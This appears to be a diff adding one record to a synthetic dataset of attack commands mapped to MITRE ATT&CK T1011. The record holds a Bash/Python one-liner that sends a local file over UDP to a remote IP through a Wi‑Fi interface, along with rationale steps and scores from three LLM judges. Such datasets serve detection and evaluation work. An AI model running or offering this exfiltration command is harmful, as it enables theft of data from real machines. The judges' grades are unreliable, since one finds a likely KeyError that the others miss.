@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "IF=wlan2; iwconfig \"$IF\" >/dev/null 2>&1 && python3 -c 'import os,sys,socket,subprocess; iface=os.environ[\"IF\"]; src=subprocess.check_output(\"ip -4 -o addr show \"+iface, shell=True).decode().split()[3].split(\"/\")[0]; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind((src,0)); s.sendto(open(sys.argv[1],\"rb\").read(), (sys.argv[2], int(sys.argv[3])))' /home/user/.local/state/cache.idx 10.55.88.11 49537",
+  "explanation": "Executes a Python UDP sender bound to the wlan2 source IP after validating the interface with iwconfig, representing exfiltration over a distinct Wi‑Fi medium per T1011.",
+  "rationale_steps": [
+    "Use iwconfig to validate the secondary Wi‑Fi interface.",
+    "Programmatically discover wlan2’s IP and bind the socket to that source.",
+    "Send the file via UDP on a high, uncommon port to avoid default routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-073fc4d7",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner is well-formed with balanced quoting, proper separators, valid redirections, and the embedded Python snippet is syntactically correct.",
+        "semantic_score": 3,
+        "semantic_justification": "Although it plausibly validates the interface and attempts UDP exfiltration bound to that interface’s IP, it relies on os.environ['IF'] without exporting IF, likely causing a KeyError and preventing execution of the exfiltration logic.",
+        "combined_score": 4.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T03:06:02.097560Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid Python syntax, and appropriate environment variable usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by using a Python script to send a local file (/home/user/.local/state/cache.idx) over UDP to a remote destination (10.55.88.11:49537) through a specific wireless interface (wlan2).",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:06:05.279547Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid command separators, correct variable expansion, and proper Python syntax within the `-c` argument.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1011 by reading a local file and sending its contents via a UDP socket, explicitly bound to a specified Wi-Fi interface's IP address, demonstrating a custom automated exfiltration mechanism to an external IP.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:38:45.874909Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
